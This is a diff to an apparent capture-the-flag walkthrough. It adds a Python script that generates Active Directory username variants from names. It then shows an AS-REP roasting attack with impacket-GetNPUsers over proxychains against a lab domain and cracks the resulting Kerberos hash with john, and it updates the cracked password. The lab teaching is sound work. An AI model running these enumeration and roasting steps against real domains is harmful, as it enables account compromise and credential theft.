@@ -396,9 +396,97 @@ If we think back to the beginning of the challenge, we were given a list of name
 Let's generate a text file that has a list of possible usernames based on what we saw on the web page.
 We could make our own script, or we could borrow one from the internet. I used this one from GitHub: [https://github.com/w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username). 
 
+
+```python
+"""
+ADgenerator.py
+This script is based on the following naming convention :
+
+NameSurname
+Name.Surname
+NamSur (3letters of each)
+Nam.Sur
+NSurname
+N.Surname
+SurnameName
+Surname.Name
+SurnameN
+Surname.N
+3 random letters and 3 random numbers (abc123) --> This one is not implemented
+
+https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html#recon-active-directory-no-credssessions
+"""
+
+import csv
+import argparse
+
+parser = argparse.ArgumentParser(description='Generate AD username based on Name and Surname')
+parser.add_argument('csvfilename', metavar="CSVFile", type=str, help='CSV File containing list of users')
+args = parser.parse_args()
+
+def opencsv(csvfilename):
+    dict = []
+    with open(csvfilename, 'r', encoding='utf-8-sig') as file:
+        csvreader = csv.reader(file)
+        for row in csvreader:
+        	dict.append([row[0],row[1]])
+    return dict
+
+def main():
+	dict = opencsv(args.csvfilename)
+	for row in dict:
+		name = row[0].lower()
+		surname = row[1].lower()
+		#NameSurname
+		print(name + surname)
+		#Name.Surname
+		print(name + "-" + surname)
+		#Name-Surname
+		print(name + "." + surname)
+		#NamSur
+		print(name[0:3] + surname[0:3])
+		#Nam-Sur
+		print(name[0:3] + "-" + surname[0:3])
+		#Nam.Sur
+		print(name[0:3] + "." + surname[0:3])
+		#NSurname
+		print(name[0] + surname)
+		#N-Surname
+		print(name[0] + "-" + surname)
+		#N.Surname
+		print(name[0] + "." + surname)
+		#SurnameName
+		print(surname + name)
+		#Surname-Name
+		print(surname + "-" + name)
+		#Surname.Name
+		print(surname + "." + name)
+		#SurNam
+		print(surname[0:3] + name[0:3])
+		#Sur-Nam
+		print(surname[0:3] + "-" + name[0:3])
+		#Sur.Nam
+		print(surname[0:3] + "." + name[0:3])
+		#Sname
+		print(surname[0] + name)
+		#S-name
+		print(surname[0] + "-" + name)
+		#S.name
+		print(surname[0] + "." + name)
+		#SurnameN
+		print(surname + name[0])
+		#Surname-N
+		print(surname + "-" + name[0])
+		#Surname.N
+		print(surname + "." + name[0])
+
+if __name__ == "__main__":
+    main()
+```
+
 First, use copy-paste to save the script into our `kali` instance. 
 Now, start by making `names.txt`, a comma separated list of the first and last names from the website.
-Be aware that this script doesn't do well with empty lines, so make sure your `names.txt` file doesn't have any blank lines in it.
+Be aware that this script doesn't do well with empty lines, so make sure your `names.txt` file doesn't have any blank lines or trailing newlines in it.
 
 ```csv
 bob,taylor
@@ -428,21 +516,20 @@ Now we can try an `as-rep roasting` attack with `impacket`.
 We specify the domain name of `ctf.local` (as the company is named `ctf`), we set `-dc-ip` to `ubuntu2`, and we specify `john` format so we can crack any resulting hashes with `john`.
 We can also run this with `-q` and `grep -v Error` to remove a lot of unnecessary junk from the output.
 With this attack, we were able to get the hash of user `jwilliams`. Copy and paste the hash into a file named `hash`, and then crack it with `john`.
-The password is `qwerty`.
+The password is `wildcat`.
 
 ```bash
 proxychains -q impacket-GetNPUsers ctf.local/ -dc-ip ubuntu2 -usersfile users.txt -format john | grep -v Error
 ```
 
 ```bash
-vim hash # Or another editor of your choice
-# $krb5asrep$18$CTF.LOCALjwilliams$d5607436ad22eb5d34822cca9c30b9e8282c2d1848d11d1443f72a153bc55122142dc8c39616c750f68646c70c936954d4f3d4f8a2d0d072f3cb7c88097253d0d968ae400fd760d4089cf2bc58a8446d6b38489a667ae1b49af29b5d94acd4f79ccfcccaa93dc4d7d52c5f76bc87b4ce89e04ee3bf20ad7ce70fc6de5db2050c9a6802f8e68455778ad43ad731022f6ccb71cc1b9dde5632b6d774e8ee708a90665a0f29116491ff997f840e3cda5f013b547a6329b80d79d5af96616bf53625dc7b61fa814397d5b82fd44cede3219d1bfdb28becf4fbee$31d2e371d2044da3dd8b498b
+echo '<hash>' > hash # Replace <hash> with the found password hash for jwilliams
 john hash
 ```
 
 ![as-rep roasting](imgs/22-impacket.png)
 
-Browse to `web-internal` on Firefox, and login as `jwilliams` with password `qwerty`.
+Browse to `web-internal` on Firefox, and login as `jwilliams` with password `wildcat`.
 Once logged in we see two pages: `Helpdesk` and `Search`.
 
 ![Helpdesk](imgs/23-helpdesk.png)
